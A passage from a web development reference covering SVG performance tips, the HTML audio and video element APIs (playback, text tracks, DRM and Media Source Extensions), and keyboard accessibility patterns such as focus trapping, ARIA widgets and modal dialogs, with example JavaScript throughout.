**Interpolation**: For smooth animations, interpolate between states:

```javascript
function interpolatePoints(start, end, progress) {
  return {
    x: start.x + (end.x - start.x) * progress,
    y: start.y + (end.y - start.y) * progress
  };
}
```

### Memory and Performance Considerations

**Detached element manipulation**: Building complex SVG structures detached from the DOM (in memory) is faster than incremental DOM updates:

```javascript
const svg = document.createElementNS(SVG_NS, 'svg');
// build entire structure
// ...
document.body.appendChild(svg); // single insertion
```

**Query performance**: `querySelectorAll` on large SVGs can be slow. Cache frequently accessed elements:

```javascript
const circles = Array.from(svg.querySelectorAll('circle'));
// reuse circles array rather than querying repeatedly
```

**Avoid layout thrashing**: Batch attribute reads and writes. Reading layout properties like `getBBox()` forces synchronous layout calculation. Batch all reads, then all writes:

```javascript
// Bad: interleaved reads and writes
elements.forEach(el => {
  const bbox = el.getBBox(); // read (forces layout)
  el.setAttribute('x', bbox.width); // write
});

// Better: batch reads, then writes
const bboxes = elements.map(el => el.getBBox());
elements.forEach((el, i) => {
  el.setAttribute('x', bboxes[i].width);
});
```

### Cross-Browser Compatibility Considerations

**Namespace handling**: All SVG-supporting browsers require proper namespace for element creation. No fallback to non-namespaced methods exists.

**Attribute name differences**: Some attributes have different JavaScript property names. For instance, `class` attribute is accessed via `className`, but on SVG elements, `className` returns `SVGAnimatedString`, requiring `className.baseVal`.

**Matrix operations**: Not all browsers implement the full matrix manipulation interface identically. Direct matrix property manipulation is most reliable.

**Measurement timing**: `getBBox()` and similar methods require elements to be rendered. Measurements on elements not yet in the document or with `display: none` may return zeros or throw errors. Ensure elements are attached and visible before measuring.

---

## Audio and Video Element APIs

### Media Element Interface Hierarchy

Both `<audio>` and `<video>` elements inherit from `HTMLMediaElement`, which provides the core API surface. The `<video>` element extends this through `HTMLVideoElement` with additional properties specific to visual rendering.

### Media Loading and Source Management

#### Source Selection and Network States

The `src` property accepts a single media URL, while the `<source>` element children enable multiple format fallbacks. The browser selects the first compatible source based on MIME type and codec strings.

```javascript
video.src = 'video.mp4';
// or
video.innerHTML = `
  <source src="video.webm" type="video/webm">
  <source src="video.mp4" type="video/mp4">
`;
video.load(); // Initiates resource selection algorithm
```

The `networkState` property tracks loading status:

- `NETWORK_EMPTY` (0): No source set
- `NETWORK_IDLE` (1): Source selected but not loading
- `NETWORK_LOADING` (2): Actively downloading
- `NETWORK_NO_SOURCE` (3): No compatible source found

The `readyState` indicates data availability:

- `HAVE_NOTHING` (0): No data
- `HAVE_METADATA` (1): Dimensions and duration known
- `HAVE_CURRENT_DATA` (2): Current frame available
- `HAVE_FUTURE_DATA` (3): Enough for immediate playback
- `HAVE_ENOUGH_DATA` (4): Enough to play through without stalling

#### Preload Strategies

The `preload` attribute controls resource loading behavior:

- `none`: Load nothing until play requested
- `metadata`: Load only metadata (duration, dimensions, tracks)
- `auto`: Load as much as appropriate (browser discretion)

```javascript
video.preload = 'metadata';
```

### Playback Control

#### Core Playback Methods

`play()` returns a Promise that resolves when playback begins or rejects if prevented:

```javascript
video.play()
  .then(() => console.log('Playing'))
  .catch(err => {
    if (err.name === 'NotAllowedError') {
      // Autoplay blocked by browser policy
    } else if (err.name === 'NotSupportedError') {
      // Source format unsupported
    }
  });
```

`pause()` stops playback synchronously. The `paused` property (boolean) indicates current state.

#### Playback Rate and Time Manipulation

`playbackRate` controls speed as a multiplier (0.5 = half speed, 2.0 = double speed). Negative values enable reverse playback in supporting browsers [Inference].

`currentTime` (in seconds) enables seeking:

```javascript
video.currentTime = 30.5; // Jump to 30.5 seconds
video.currentTime += 10; // Skip forward 10 seconds
```

The `duration` property provides total media length in seconds (NaN if unknown).

`defaultPlaybackRate` sets the initial rate, while `playbackRate` reflects the current rate.

### Buffering and Seeking

#### TimeRanges Interface

`buffered` returns a `TimeRanges` object representing downloaded byte ranges:

```javascript
const buffered = video.buffered;
for (let i = 0; i < buffered.length; i++) {
  console.log(`Range ${i}: ${buffered.start(i)} - ${buffered.end(i)}`);
}
```

`seekable` indicates which time ranges can be seeked to. `played` tracks ranges that have been played.

#### Seeking Operations

`seeking` (boolean) indicates if a seek is in progress. The `fastSeek()` method trades precision for speed:

```javascript
video.fastSeek(60); // Seek near 60s, may land on nearest keyframe
```

Events during seeking:

- `seeking`: Fired when seek begins
- `seeked`: Fired when seek completes
- `timeupdate`: Fires during playback (typically 4-60Hz)

### Audio Control

#### Volume and Muting

`volume` ranges from 0.0 to 1.0:

```javascript
video.volume = 0.5; // 50% volume
```

`muted` (boolean) silences audio without changing `volume`:

```javascript
video.muted = true;
```

[Inference] Setting `muted` likely bypasses volume calculations at a lower level for performance.

#### Audio Track Management

`audioTracks` returns an `AudioTrackList` for multi-audio content:

```javascript
const tracks = video.audioTracks;
for (let track of tracks) {
  console.log(track.label, track.language, track.enabled);
}
// Enable specific track
video.audioTracks[1].enabled = true;
```

### Video-Specific Properties

#### Dimensions and Aspect Ratio

`videoWidth` and `videoHeight` provide intrinsic video dimensions (readonly):

```javascript
const aspectRatio = video.videoWidth / video.videoHeight;
```

These differ from `width`/`height` attributes which set display size.

`poster` specifies an image URL displayed before playback:

```javascript
video.poster = 'thumbnail.jpg';
```

#### Presentation Modes

`requestFullscreen()` enters fullscreen mode (returns Promise):

```javascript
video.requestFullscreen()
  .catch(err => console.error('Fullscreen failed:', err));
```

`requestPictureInPicture()` creates floating video window:

```javascript
video.requestPictureInPicture()
  .then(pipWindow => {
    pipWindow.addEventListener('resize', () => {
      console.log(`PiP size: ${pipWindow.width}x${pipWindow.height}`);
    });
  });
```

Exit via `document.exitPictureInPicture()` or `document.exitFullscreen()`.

`disablePictureInPicture` attribute prevents PiP:

```javascript
video.disablePictureInPicture = true;
```

#### Playback Quality

`getVideoPlaybackQuality()` returns quality metrics:

```javascript
const quality = video.getVideoPlaybackQuality();
console.log({
  totalFrames: quality.totalVideoFrames,
  droppedFrames: quality.droppedVideoFrames,
  corruptedFrames: quality.corruptedVideoFrames,
  creationTime: quality.creationTime
});
```

### Text Track Management

#### TextTrack API

`textTracks` provides access to subtitles, captions, and descriptions:

```javascript
const tracks = video.textTracks;

// Add track dynamically
const track = video.addTextTrack('subtitles', 'English', 'en');
track.mode = 'showing'; // 'disabled', 'hidden', or 'showing'

// Add cues
const cue = new VTTCue(0, 5, 'First subtitle text');
track.addCue(cue);
```

Track `mode` values:

- `disabled`: Not loaded
- `hidden`: Loaded but not displayed (accessible to JS)
- `showing`: Displayed to user

Listen to cue changes:

```javascript
track.addEventListener('cuechange', () => {
  const activeCues = track.activeCues;
  for (let cue of activeCues) {
    console.log(cue.text);
  }
});
```

### Media Streams and Capture

#### Capturing to Canvas

`drawImage()` can render video frames to canvas:

```javascript
const canvas = document.createElement('canvas');
const ctx = canvas.getContext('2d');
canvas.width = video.videoWidth;
canvas.height = video.videoHeight;

function captureFrame() {
  ctx.drawImage(video, 0, 0);
  return canvas.toDataURL('image/png');
}
```

#### MediaStream Integration

`captureStream()` creates a live `MediaStream` from the media element:

```javascript
const stream = video.captureStream(); // or audio.captureStream()
const mediaRecorder = new MediaRecorder(stream);

mediaRecorder.ondataavailable = e => {
  // e.data contains recorded Blob chunks
};
mediaRecorder.start();
```

`srcObject` accepts `MediaStream` for WebRTC/getUserMedia:

```javascript
navigator.mediaDevices.getUserMedia({ video: true })
  .then(stream => {
    video.srcObject = stream;
  });
```

### Media Session API Integration

Control media notification UI and hardware keys:

```javascript
navigator.mediaSession.metadata = new MediaMetadata({
  title: 'Track Title',
  artist: 'Artist Name',
  album: 'Album Name',
  artwork: [
    { src: 'cover-96.png', sizes: '96x96', type: 'image/png' },
    { src: 'cover-512.png', sizes: '512x512', type: 'image/png' }
  ]
});

navigator.mediaSession.setActionHandler('play', () => video.play());
navigator.mediaSession.setActionHandler('pause', () => video.pause());
navigator.mediaSession.setActionHandler('seekbackward', () => {
  video.currentTime = Math.max(0, video.currentTime - 10);
});
navigator.mediaSession.setActionHandler('seekforward', () => {
  video.currentTime = Math.min(video.duration, video.currentTime + 10);
});
```

Supported actions include: `play`, `pause`, `seekbackward`, `seekforward`, `previoustrack`, `nexttrack`, `skipad`, `stop`, `seekto`, `togglemicrophone`, `togglecamera`, `hangup`.

### Media Events Lifecycle

#### Loading Events

- `loadstart`: Resource loading begins
- `durationchange`: `duration` attribute updated
- `loadedmetadata`: Metadata loaded (`readyState` ≥ HAVE_METADATA)
- `loadeddata`: First frame loaded (`readyState` ≥ HAVE_CURRENT_DATA)
- `progress`: Browser receiving data
- `canplay`: Playback can start (`readyState` ≥ HAVE_FUTURE_DATA)
- `canplaythrough`: Can play through without buffering (`readyState` = HAVE_ENOUGH_DATA)

#### Playback Events

- `play`: Playback requested (via `play()` or autoplay)
- `playing`: Playback started after being paused or delayed
- `pause`: Paused
- `ended`: Playback reached the end
- `timeupdate`: `currentTime` changed
- `waiting`: Playback stopped due to buffering
- `stalled`: Browser attempting to fetch but not receiving data

#### State Change Events

- `volumechange`: Volume or muted state changed
- `ratechange`: `playbackRate` changed
- `seeking`: Seek operation started
- `seeked`: Seek operation completed
- `suspend`: Loading suspended (browser discretion)
- `abort`: Resource loading aborted (not due to error)
- `error`: Fatal error occurred
- `emptied`: Media element reset to empty state

### Error Handling

#### MediaError Interface

`error` property contains a `MediaError` object on failure:

```javascript
video.addEventListener('error', () => {
  const error = video.error;
  
  switch(error.code) {
    case MediaError.MEDIA_ERR_ABORTED:
      console.error('Fetch aborted by user');
      break;
    case MediaError.MEDIA_ERR_NETWORK:
      console.error('Network error during download');
      break;
    case MediaError.MEDIA_ERR_DECODE:
      console.error('Decoding error');
      break;
    case MediaError.MEDIA_ERR_SRC_NOT_SUPPORTED:
      console.error('Format not supported');
      break;
  }
  
  console.error('Message:', error.message);
});
```

Error codes:

- `MEDIA_ERR_ABORTED` (1): User aborted
- `MEDIA_ERR_NETWORK` (2): Network failure
- `MEDIA_ERR_DECODE` (3): Decode error
- `MEDIA_ERR_SRC_NOT_SUPPORTED` (4): Unsupported format

### Remote Playback API

Control casting to remote devices:

```javascript
video.remote.watchAvailability(available => {
  if (available) {
    // Show cast button
  }
});

video.remote.prompt()
  .then(() => console.log('Connected to remote device'))
  .catch(err => console.error('Connection failed:', err));

video.remote.addEventListener('connecting', () => {
  console.log('Connecting...');
});

video.remote.addEventListener('connect', () => {
  console.log('Connected');
});

video.remote.addEventListener('disconnect', () => {
  console.log('Disconnected');
});

console.log(video.remote.state); // 'disconnected', 'connecting', or 'connected'
```

### Encrypted Media Extensions (EME)

Handle DRM-protected content:

```javascript
video.addEventListener('encrypted', e => {
  const config = [{
    initDataTypes: ['cenc'],
    videoCapabilities: [{
      contentType: 'video/mp4;codecs="avc1.42E01E"'
    }]
  }];
  
  navigator.requestMediaKeySystemAccess('com.widevine.alpha', config)
    .then(keySystemAccess => keySystemAccess.createMediaKeys())
    .then(mediaKeys => {
      video.setMediaKeys(mediaKeys);
      const session = mediaKeys.createSession();
      
      session.addEventListener('message', event => {
        // Send event.message to license server
        // Receive license response
        // session.update(licenseResponse);
      });
      
      return session.generateRequest(e.initDataType, e.initData);
    });
});
```

Key system identifiers [Unverified - these may vary]:

- `com.widevine.alpha`: Widevine
- `com.microsoft.playready`: PlayReady
- `com.apple.fps`: FairPlay

### Media Source Extensions (MSE)

Programmatic media stream construction:

```javascript
const mediaSource = new MediaSource();
video.src = URL.createObjectURL(mediaSource);

mediaSource.addEventListener('sourceopen', () => {
  const sourceBuffer = mediaSource.addSourceBuffer('video/mp4; codecs="avc1.42E01E"');
  
  fetch('segment1.m4s')
    .then(response => response.arrayBuffer())
    .then(data => {
      sourceBuffer.appendBuffer(data);
    });
  
  sourceBuffer.addEventListener('updateend', () => {
    if (!sourceBuffer.updating && mediaSource.readyState === 'open') {
      // Can append more segments or call mediaSource.endOfStream()
    }
  });
});
```

`MediaSource` properties:

- `duration`: Media duration (writable)
- `readyState`: 'closed', 'open', or 'ended'
- `sourceBuffers`: List of `SourceBuffer` objects
- `activeSourceBuffers`: Currently selected buffers

`SourceBuffer` methods:

- `appendBuffer(data)`: Add media data
- `remove(start, end)`: Remove time range
- `abort()`: Abort current segment append
- `changeType(type)`: Change codec mid-stream

### Audio-Specific Features

#### Spatial Audio

[Inference] The `AudioContext` integration provides advanced spatial audio, though this typically requires the Web Audio API rather than direct media element methods.

Create an audio source node from the element:

```javascript
const audioCtx = new AudioContext();
const source = audioCtx.createMediaElementSource(audio);
const panner = audioCtx.createPanner();

panner.panningModel = 'HRTF';
panner.setPosition(1, 0, 0); // Right speaker

source.connect(panner);
panner.connect(audioCtx.destination);
```

### Looping and Playback Control

`loop` (boolean) enables continuous playback:

```javascript
audio.loop = true;
```

`ended` property indicates playback completion:

```javascript
video.addEventListener('ended', () => {
  console.log('Video finished');
  if (!video.loop) {
    // Show replay button
  }
});
```

### Autoplay Policies

Autoplay behavior varies by browser and user interaction:

```javascript
video.autoplay = true;
video.muted = true; // Muted autoplay more likely to succeed

video.play().catch(err => {
  if (err.name === 'NotAllowedError') {
    // Show play button, require user interaction
    playButton.addEventListener('click', () => {
      video.play();
    });
  }
});
```

[Inference] Browsers generally allow muted autoplay but block unmuted autoplay without user interaction to prevent disruptive experiences.

### CORS and Credentials

`crossOrigin` attribute controls CORS behavior:

```javascript
video.crossOrigin = 'anonymous'; // or 'use-credentials'
```

Without proper CORS headers, canvas tainting occurs [Inference], preventing `toDataURL()` and `getImageData()` on canvases containing the video.

### Performance Considerations

#### Hardware Acceleration

[Unverified] Browsers typically use hardware decoding for supported codecs, but forcing software fallback isn't standardized in the API.

#### Memory Management

`load()` resets the element and releases resources:

```javascript
video.pause();
video.removeAttribute('src');
video.load(); // Releases memory
```

Setting `srcObject = null` or `src = ''` alone may not immediately free resources [Inference].

### Controls and UI

`controls` (boolean) shows browser default controls:

```javascript
video.controls = true;
```

`controlsList` restricts specific controls (Chrome/Edge):

```javascript
video.controlsList = 'nodownload nofullscreen noremoteplayback';
```

[Unverified] The `controlsList` feature may not be standardized across all browsers.

### Mobile-Specific Behavior

`playsInline` prevents fullscreen on iOS:

```javascript
video.playsInline = true;
```

Without this, iOS Safari automatically enters fullscreen on play [Inference based on historical iOS behavior, though policies may have changed].

### Codec Support Detection

Query format support before loading:

```javascript
const canPlayMP4 = video.canPlayType('video/mp4; codecs="avc1.42E01E"');
// Returns: '', 'maybe', or 'probably'

if (canPlayMP4 === 'probably' || canPlayMP4 === 'maybe') {
  video.src = 'video.mp4';
}
```

`MediaSource.isTypeSupported()` for MSE compatibility:

```javascript
if (MediaSource.isTypeSupported('video/mp4; codecs="avc1.42E01E"')) {
  // Use MSE with this codec
}
```

### Advanced Synchronization

Multiple media elements can be synchronized via `currentTime` manipulation:

```javascript
const videos = [video1, video2];
let syncing = false;

videos.forEach(v => {
  v.addEventListener('timeupdate', () => {
    if (!syncing) {
      syncing = true;
      const targetTime = v.currentTime;
      videos.forEach(other => {
        if (other !== v && Math.abs(other.currentTime - targetTime) > 0.1) {
          other.currentTime = targetTime;
        }
      });
      syncing = false;
    }
  });
});
```

[Inference] Perfect frame-level synchronization across separate elements is difficult to achieve due to independent decode pipelines and rendering timing.

---

# Accessibility in DOM

## ARIA Attributes


---

## Role Attribute

---

## Keyboard Navigation Handling

### Focus Management

#### Programmatic Focus Control

Focus management requires explicit handling of the `focus()` method on DOM elements. The `tabindex` attribute controls whether elements can receive focus and their position in the tab order:

- `tabindex="0"`: Element enters natural tab order
- `tabindex="-1"`: Element can receive programmatic focus but is removed from tab order
- `tabindex="1+"`: Creates explicit tab order (generally avoid due to maintenance issues)

```javascript
// Basic focus management
const element = document.getElementById('target');
element.focus();

// Focus with options
element.focus({ preventScroll: true });

// Restore focus after modal closes
const previousFocus = document.activeElement;
modal.close();
previousFocus.focus();
```

#### Focus Trapping

Focus trapping confines keyboard navigation within a specific container, essential for modals and dialogs:

```javascript
function trapFocus(container) {
  const focusableElements = container.querySelectorAll(
    'button, [href], input, select, textarea, [tabindex]:not([tabindex="-1"])'
  );
  const firstElement = focusableElements[0];
  const lastElement = focusableElements[focusableElements.length - 1];

  container.addEventListener('keydown', (e) => {
    if (e.key !== 'Tab') return;

    if (e.shiftKey) {
      if (document.activeElement === firstElement) {
        e.preventDefault();
        lastElement.focus();
      }
    } else {
      if (document.activeElement === lastElement) {
        e.preventDefault();
        firstElement.focus();
      }
    }
  });
}
```

#### Focus Indicators

Custom focus indicators must maintain sufficient contrast and visibility:

```css
/* Enhance default focus ring */
:focus {
  outline: 2px solid #0066cc;
  outline-offset: 2px;
}

/* Focus-visible for mouse vs keyboard distinction */
:focus-visible {
  outline: 2px solid #0066cc;
  outline-offset: 2px;
}

:focus:not(:focus-visible) {
  outline: none;
}
```

### Keyboard Event Handling

#### Event Capture and Propagation

Keyboard events follow the standard DOM event flow: capture phase → target phase → bubble phase.

```javascript
element.addEventListener('keydown', handler, { capture: true });
element.addEventListener('keydown', handler); // Bubble phase (default)

// Stop propagation when needed
function handler(e) {
  e.stopPropagation(); // Prevents bubbling to parent
  e.preventDefault(); // Prevents default browser behavior
}
```

#### Key Code vs Key Property

Modern keyboard handling uses `event.key` rather than deprecated `event.keyCode`:

```javascript
element.addEventListener('keydown', (e) => {
  switch(e.key) {
    case 'Enter':
    case ' ': // Space
      handleActivation();
      break;
    case 'ArrowUp':
    case 'ArrowDown':
    case 'ArrowLeft':
    case 'ArrowRight':
      handleNavigation(e.key);
      break;
    case 'Escape':
      handleClose();
      break;
    case 'Home':
      handleFirst();
      break;
    case 'End':
      handleLast();
      break;
  }
});
```

#### Modifier Key Detection

```javascript
element.addEventListener('keydown', (e) => {
  if (e.ctrlKey && e.key === 's') {
    e.preventDefault(); // Prevent browser save dialog
    handleSave();
  }
  
  if (e.shiftKey && e.key === 'Tab') {
    // Reverse tab navigation
  }
  
  if (e.metaKey) { // Command on Mac, Windows key on PC
    // Handle meta key combinations
  }
  
  if (e.altKey) {
    // Handle alt key combinations
  }
});
```

### ARIA Keyboard Patterns

#### Button Pattern

Buttons activate on Space and Enter:

```javascript
function makeButtonAccessible(element) {
  element.setAttribute('role', 'button');
  element.setAttribute('tabindex', '0');
  
  element.addEventListener('keydown', (e) => {
    if (e.key === 'Enter' || e.key === ' ') {
      e.preventDefault();
      element.click();
    }
  });
}
```

#### Listbox Pattern

Vertical lists use Arrow Up/Down, optional Home/End:

```javascript
class Listbox {
  constructor(container) {
    this.container = container;
    this.options = Array.from(container.querySelectorAll('[role="option"]'));
    this.currentIndex = 0;
    
    container.setAttribute('role', 'listbox');
    container.setAttribute('tabindex', '0');
    
    container.addEventListener('keydown', (e) => this.handleKeydown(e));
  }
  
  handleKeydown(e) {
    switch(e.key) {
      case 'ArrowDown':
        e.preventDefault();
        this.currentIndex = Math.min(this.currentIndex + 1, this.options.length - 1);
        this.updateFocus();
        break;
      case 'ArrowUp':
        e.preventDefault();
        this.currentIndex = Math.max(this.currentIndex - 1, 0);
        this.updateFocus();
        break;
      case 'Home':
        e.preventDefault();
        this.currentIndex = 0;
        this.updateFocus();
        break;
      case 'End':
        e.preventDefault();
        this.currentIndex = this.options.length - 1;
        this.updateFocus();
        break;
      case 'Enter':
      case ' ':
        e.preventDefault();
        this.selectOption(this.currentIndex);
        break;
    }
  }
  
  updateFocus() {
    this.options.forEach((opt, i) => {
      opt.setAttribute('aria-selected', i === this.currentIndex);
      opt.setAttribute('tabindex', i === this.currentIndex ? '0' : '-1');
    });
    this.options[this.currentIndex].focus();
  }
}
```

#### Menu Pattern

Menus require both vertical and horizontal navigation:

```javascript
class Menu {
  constructor(menubar) {
    this.menubar = menubar;
    this.menus = Array.from(menubar.querySelectorAll('[role="menuitem"]'));
    this.currentIndex = 0;
    
    menubar.addEventListener('keydown', (e) => this.handleKeydown(e));
  }
  
  handleKeydown(e) {
    switch(e.key) {
      case 'ArrowRight':
        e.preventDefault();
        this.currentIndex = (this.currentIndex + 1) % this.menus.length;
        this.menus[this.currentIndex].focus();
        break;
      case 'ArrowLeft':
        e.preventDefault();
        this.currentIndex = (this.currentIndex - 1 + this.menus.length) % this.menus.length;
        this.menus[this.currentIndex].focus();
        break;
      case 'ArrowDown':
        e.preventDefault();
        this.openSubmenu();
        break;
      case 'Escape':
        e.preventDefault();
        this.closeSubmenu();
        break;
    }
  }
}
```

#### Tabs Pattern

Tab panels use Arrow Left/Right, sometimes Home/End:

```javascript
class Tabs {
  constructor(tablist) {
    this.tablist = tablist;
    this.tabs = Array.from(tablist.querySelectorAll('[role="tab"]'));
    this.panels = this.tabs.map(tab => 
      document.getElementById(tab.getAttribute('aria-controls'))
    );
    
    this.tabs.forEach((tab, i) => {
      tab.addEventListener('keydown', (e) => this.handleKeydown(e, i));
      tab.addEventListener('click', () => this.selectTab(i));
    });
  }
  
  handleKeydown(e, currentIndex) {
    let newIndex;
    
    switch(e.key) {
      case 'ArrowLeft':
        e.preventDefault();
        newIndex = currentIndex === 0 ? this.tabs.length - 1 : currentIndex - 1;
        break;
      case 'ArrowRight':
        e.preventDefault();
        newIndex = (currentIndex + 1) % this.tabs.length;
        break;
      case 'Home':
        e.preventDefault();
        newIndex = 0;
        break;
      case 'End':
        e.preventDefault();
        newIndex = this.tabs.length - 1;
        break;
      default:
        return;
    }
    
    this.selectTab(newIndex);
    this.tabs[newIndex].focus();
  }
  
  selectTab(index) {
    this.tabs.forEach((tab, i) => {
      const isSelected = i === index;
      tab.setAttribute('aria-selected', isSelected);
      tab.setAttribute('tabindex', isSelected ? '0' : '-1');
      this.panels[i].hidden = !isSelected;
    });
  }
}
```

#### Combobox Pattern

Comboboxes combine text input with list selection:

```javascript
class Combobox {
  constructor(input) {
    this.input = input;
    this.listbox = document.getElementById(input.getAttribute('aria-controls'));
    this.options = Array.from(this.listbox.querySelectorAll('[role="option"]'));
    this.isOpen = false;
    this.activeIndex = -1;
    
    input.setAttribute('role', 'combobox');
    input.setAttribute('aria-autocomplete', 'list');
    input.setAttribute('aria-expanded', 'false');
    
    input.addEventListener('keydown', (e) => this.handleKeydown(e));
  }
  
  handleKeydown(e) {
    switch(e.key) {
      case 'ArrowDown':
        e.preventDefault();
        if (!this.isOpen) {
          this.open();
        } else {
          this.activeIndex = Math.min(this.activeIndex + 1, this.options.length - 1);
          this.updateActiveDescendant();
        }
        break;
      case 'ArrowUp':
        e.preventDefault();
        if (this.isOpen) {
          this.activeIndex = Math.max(this.activeIndex - 1, 0);
          this.updateActiveDescendant();
        }
        break;
      case 'Enter':
        e.preventDefault();
        if (this.isOpen && this.activeIndex >= 0) {
          this.selectOption(this.activeIndex);
        }
        break;
      case 'Escape':
        e.preventDefault();
        this.close();
        break;
    }
  }
  
  updateActiveDescendant() {
    this.options.forEach((opt, i) => {
      opt.setAttribute('aria-selected', i === this.activeIndex);
    });
    this.input.setAttribute('aria-activedescendant', 
      this.options[this.activeIndex].id);
  }
}
```

### Roving Tabindex

Roving tabindex ensures only one element in a group is in the tab order at a time, while allowing arrow key navigation within the group:

```javascript
class RovingTabindex {
  constructor(container, itemSelector) {
    this.container = container;
    this.items = Array.from(container.querySelectorAll(itemSelector));
    this.currentIndex = 0;
    
    this.items.forEach((item, i) => {
      item.setAttribute('tabindex', i === 0 ? '0' : '-1');
      item.addEventListener('keydown', (e) => this.handleKeydown(e, i));
      item.addEventListener('focus', () => this.setCurrentIndex(i));
    });
  }
  
  handleKeydown(e, currentIndex) {
    let newIndex;
    
    switch(e.key) {
      case 'ArrowRight':
      case 'ArrowDown':
        e.preventDefault();
        newIndex = (currentIndex + 1) % this.items.length;
        break;
      case 'ArrowLeft':
      case 'ArrowUp':
        e.preventDefault();
        newIndex = (currentIndex - 1 + this.items.length) % this.items.length;
        break;
      case 'Home':
        e.preventDefault();
        newIndex = 0;
        break;
      case 'End':
        e.preventDefault();
        newIndex = this.items.length - 1;
        break;
      default:
        return;
    }
    
    this.setCurrentIndex(newIndex);
    this.items[newIndex].focus();
  }
  
  setCurrentIndex(index) {
    this.items.forEach((item, i) => {
      item.setAttribute('tabindex', i === index ? '0' : '-1');
    });
    this.currentIndex = index;
  }
}
```

### Skip Links and Landmarks

#### Skip Links

Skip links allow keyboard users to bypass repetitive content:

```html
<a href="#main-content" class="skip-link">Skip to main content</a>

<style>
.skip-link {
  position: absolute;
  top: -40px;
  left: 0;
  background: #000;
  color: #fff;
  padding: 8px;
  z-index: 100;
}

.skip-link:focus {
  top: 0;
}
</style>
```

```javascript
// Ensure skip link target receives focus
document.querySelectorAll('a[href^="#"]').forEach(link => {
  link.addEventListener('click', (e) => {
    const target = document.querySelector(link.getAttribute('href'));
    if (target) {
      target.setAttribute('tabindex', '-1');
      target.focus();
    }
  });
});
```

#### Landmark Navigation

Semantic HTML and ARIA landmarks enable navigation via screen reader shortcuts:

```html
<header role="banner">
  <nav role="navigation" aria-label="Main">
    <!-- Primary navigation -->
  </nav>
</header>

<main role="main" id="main-content">
  <article role="article">
    <!-- Content -->
  </article>
</main>

<aside role="complementary" aria-label="Related">
  <!-- Sidebar -->
</aside>

<footer role="contentinfo">
  <!-- Footer content -->
</footer>
```

### Keyboard Shortcuts

#### Custom Shortcuts

Implement custom shortcuts with care to avoid conflicts:

```javascript
class KeyboardShortcuts {
  constructor() {
    this.shortcuts = new Map();
    document.addEventListener('keydown', (e) => this.handleKeydown(e));
  }
  
  register(key, modifiers, handler) {
    const shortcutKey = this.createKey(key, modifiers);
    this.shortcuts.set(shortcutKey, handler);
  }
  
  createKey(key, modifiers = {}) {
    const parts = [];
    if (modifiers.ctrl) parts.push('ctrl');
    if (modifiers.shift) parts.push('shift');
    if (modifiers.alt) parts.push('alt');
    if (modifiers.meta) parts.push('meta');
    parts.push(key.toLowerCase());
    return parts.join('+');
  }
  
  handleKeydown(e) {
    // Don't intercept shortcuts in form fields
    if (e.target.matches('input, textarea, select')) {
      return;
    }
    
    const shortcutKey = this.createKey(e.key, {
      ctrl: e.ctrlKey,
      shift: e.shiftKey,
      alt: e.altKey,
      meta: e.metaKey
    });
    
    const handler = this.shortcuts.get(shortcutKey);
    if (handler) {
      e.preventDefault();
      handler(e);
    }
  }
}

// Usage
const shortcuts = new KeyboardShortcuts();
shortcuts.register('s', { ctrl: true }, () => save());
shortcuts.register('/', {}, () => focusSearch());
shortcuts.register('?', {}, () => showHelp());
```

#### Documenting Shortcuts

Make shortcuts discoverable:

```html
<div role="dialog" aria-label="Keyboard shortcuts">
  <h2>Keyboard Shortcuts</h2>
  <dl>
    <dt><kbd>Ctrl</kbd> + <kbd>S</kbd></dt>
    <dd>Save changes</dd>
    
    <dt><kbd>/</kbd></dt>
    <dd>Focus search</dd>
    
    <dt><kbd>?</kbd></dt>
    <dd>Show this help</dd>
  </dl>
</div>
```

### Handling Forms

#### Form Navigation

Proper form structure supports efficient keyboard navigation:

```html
<form>
  <fieldset>
    <legend>Personal Information</legend>
    
    <label for="name">Name</label>
    <input type="text" id="name" required>
    
    <label for="email">Email</label>
    <input type="email" id="email" required>
  </fieldset>
  
  <fieldset>
    <legend>Preferences</legend>
    
    <div role="group" aria-labelledby="notification-label">
      <span id="notification-label">Notifications</span>
      <label>
        <input type="checkbox" name="notify-email">
        Email
      </label>
      <label>
        <input type="checkbox" name="notify-sms">
        SMS
      </label>
    </div>
  </fieldset>
  
  <button type="submit">Submit</button>
</form>
```

#### Error Handling

Link error messages to form fields:

```javascript
function showFieldError(field, message) {
  const errorId = `${field.id}-error`;
  let errorElement = document.getElementById(errorId);
  
  if (!errorElement) {
    errorElement = document.createElement('div');
    errorElement.id = errorId;
    errorElement.setAttribute('role', 'alert');
    errorElement.className = 'error-message';
    field.parentNode.appendChild(errorElement);
  }
  
  errorElement.textContent = message;
  field.setAttribute('aria-invalid', 'true');
  field.setAttribute('aria-describedby', errorId);
  field.focus();
}

function clearFieldError(field) {
  const errorId = `${field.id}-error`;
  const errorElement = document.getElementById(errorId);
  
  if (errorElement) {
    errorElement.remove();
  }
  
  field.removeAttribute('aria-invalid');
  field.removeAttribute('aria-describedby');
}
```

### Modal Dialogs

Complete modal implementation with focus management:

```javascript
class Modal {
  constructor(element) {
    this.element = element;
    this.previousFocus = null;
    this.isOpen = false;
    
    element.setAttribute('role', 'dialog');
    element.setAttribute('aria-modal', 'true');
    element.hidden = true;
    
    this.bindEvents();
  }
  
  bindEvents() {
    // Close button
    const closeBtn = this.element.querySelector('[data-close]');
    if (closeBtn) {
      closeBtn.addEventListener('click', () => this.close());
    }
    
    // Backdrop click
    this.element.addEventListener('click', (e) => {
      if (e.target === this.element) {
        this.close();
      }
    });
    
    // Keyboard handling
    this.element.addEventListener('keydown', (e) => {
      if (e.key === 'Escape') {
        this.close();
      }
      
      if (e.key === 'Tab') {
        this.trapFocus(e);
      }
    });
  }
  
  open() {
    this.previousFocus = document.activeElement;
    this.element.hidden = false;
    this.isOpen = true;
    
    // Focus first focusable element
    const focusable = this.getFocusableElements();
    if (focusable.length) {
      focusable[0].focus();
    }
    
    document.body.style.overflow = 'hidden';
  }
  
  close() {
    this.element.hidden = true;
    this.isOpen = false;
    document.body.style.overflow = '';
    
    if (this.previousFocus) {
      this.previousFocus.focus();
    }
  }
  
  getFocusableElements() {
    return Array.from(this.element.querySelectorAll(
      'button, [href], input, select, textarea, [tabindex]:not([tabindex="-1"])'
    )).filter(el => !el.disabled && el.offsetParent !== null);
  }
  
  trapFocus(e) {
    const focusable = this.getFocusableElements();
    const first = focusable[0];
    const last = focusable[focusable.length - 1];
    
    if (e.shiftKey) {
      if (document.activeElement === first) {
        e.preventDefault();
        last.focus();
      }
    } else {
      if (document.activeElement === last) {
        e.preventDefault();
        first.focus();
      }
    }
  }
}
```

### React-Specific Patterns

#### Focus Management in React

```javascript
import { useRef, useEffect } from 'react';

function Dialog({ isOpen, onClose, children }) {
  const dialogRef = useRef();
